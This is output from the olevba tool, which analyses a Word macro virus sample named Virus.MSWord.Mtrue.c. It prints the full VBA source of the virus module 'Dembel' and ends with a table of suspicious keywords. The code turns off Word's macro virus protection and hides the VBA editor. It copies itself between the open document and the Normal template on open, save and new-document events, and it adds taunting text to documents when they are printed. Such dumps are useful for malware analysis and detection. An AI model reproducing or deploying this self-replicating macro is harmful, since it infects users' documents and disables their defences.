olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mtrue.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mtrue.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Dembel.bas 
in file: Virus.MSWord.Mtrue.c - OLE stream: 'Macros/VBA/Dembel'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Äĺěáĺëü
Option Explicit

Dim ResultFDoc As Boolean
Dim ResultFTemplite As Boolean
Dim Path_Normal As String
Dim Path_Doc As String
Dim I As Integer
Dim HowMach As Integer
Dim Doc As Boolean
Dim N As Integer
Const Mname As String = "dembel"

Public Sub Organizer()
  CommandBars("Visual Basic").Enabled = True
  'CommandBars("Tools").Controls(12).Delete
  With CommandBars("Visual Basic")
    For I = 1 To .Controls.Count
      .Controls(I).Enabled = False
    Next I
  End With
  ShowVisualBasicEditor = False
  Application.DisplayStatusBar = True
  With Options
    .VirusProtection = False
    .AllowFastSave = True
    .SaveInterval = 3
  End With
End Sub

Public Sub AutoNew()
    Call Organizer
    Call File1
End Sub

Public Sub FileSaveAll()
  ShowVisualBasicEditor = False
  Call File1
  Application.ActiveDocument.Save
End Sub

Public Sub File1()
  ShowVisualBasicEditor = False
  ResultFDoc = False
  HowMach = Application.NormalTemplate.VBProject.VBComponents.Count
  For I = 1 To HowMach
    If Application.NormalTemplate.VBProject.VBComponents(I).Name = Mname Then ResultFDoc = True
  Next I
  If ResultFDoc = False Then
    Path_Normal = Application.NormalTemplate.FullName
    Path_Doc = Application.ActiveDocument.FullName
    Application.OrganizerCopy Source:=Path_Normal, Destination:=Path_Doc, Name:="Dembel", Object:=wdOrganizerObjectProjectItems
  End If
End Sub
Public Sub FileSave()
  Call File1
  Application.ActiveDocument.Save
End Sub

Public Sub FilePrintDefault()
  ShowVisualBasicEditor = False
  ActiveDocument.Content.InsertAfter Text:="Ŕ âŕě íđŕâčňń˙ ŔĐČß ?"
  ActiveDocument.PrintOut
End Sub

Public Sub FilePrint()
  ShowVisualBasicEditor = False
  ActiveDocument.Content.InsertAfter Text:="Äĺěáĺëü íĺ čçáĺćĺí !!!"
  Dialogs(wdDialogFilePrint).Show
End Sub


Public Sub AutoOpen()
  ShowVisualBasicEditor = False
  ResultFDoc = False
  HowMach = Application.ActiveDocument.VBProject.VBComponents.Count
  For I = 1 To HowMach
    If Application.ActiveDocument.VBProject.VBComponents(I).Name = Mname Then ResultFDoc = True
  Next I
  If ResultFDoc = False Then
    Path_Normal = Application.NormalTemplate.FullName
    Path_Doc = Application.ActiveDocument.FullName
    Application.OrganizerCopy Source:=Path_Doc, Destination:=Path_Normal, Name:="Dembel", Object:=wdOrganizerObjectProjectItems
  End If
  
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

